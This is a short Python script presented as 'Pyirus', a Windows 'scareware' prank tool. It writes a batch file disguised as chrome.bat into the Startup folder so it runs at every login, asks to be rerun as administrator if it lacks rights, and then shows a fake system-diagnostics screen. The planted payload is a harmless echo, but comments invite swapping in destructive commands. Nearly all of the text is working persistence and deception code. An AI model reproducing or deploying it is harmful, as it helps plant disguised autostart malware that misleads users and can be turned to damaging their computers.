
# Pyirusv2.0
# Copyright (C) 2018-2019 M.Anish <aneesh25861@gmail.com>
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

'''PYIRUS A Simple Python Startup Scareware for windows developed by M.Anish '''

# This is python3 version of Cstorm.
# This Python Script is for Simple Pranks only. Use it at your own risk.
# The developer should not be held responsible under any case.

import os
def tunnel():
        os.system('echo %USERPROFILE%>user')
def tscan():
       if os.path.exists('user'):
        with open('user','r') as f:
                s=f.read().strip()
                s=s+'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
                if os.path.exists(s):
                 with open(s+'\chrome.bat','w') as i:
                         i.write('\necho Hello World\npause')    #Here you can even write destructive commands to be executed by cmd.exe
                else:
                    try:
                       s='C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp'
                       if os.path.exists(s):
                          with open(s+'\chrome.bat','w') as i:
                              i.write('\necho Hello World\npause')    #Here you can even write destructive commands to be executed by cmd.exe
                    except PermissionError:
                               lol=os.getcwd()
                               with open('run.bat','w') as p:
                                  p.write('py '+lol+'\pyirus.py \npause')
                               print('\nPlease run run.bat program as administrator!\n')
                               x=input()
                               exit()
       else:
            exit(0)
def ok():
       if os.path.exists('user'):
           os.remove('user')
def run():
        tunnel()
        tscan()
        
def display(file):
        with open(file,'r') as f:
            s=f.read(1024)
            print(s)
            while len(s)>0:
                s=f.read(1024)
                print(s)
def pause():
        q=input('\nPress any key to continue...\n')
        
def main():
  run()
  ok()
  print(' \n |----- System Diagonists -----| ')
  print('\n Checking PC for problems...')
  os.system('systeminfo>getlog')
  display('getlog')
  os.remove('getlog')
  pause()
  
main()
 
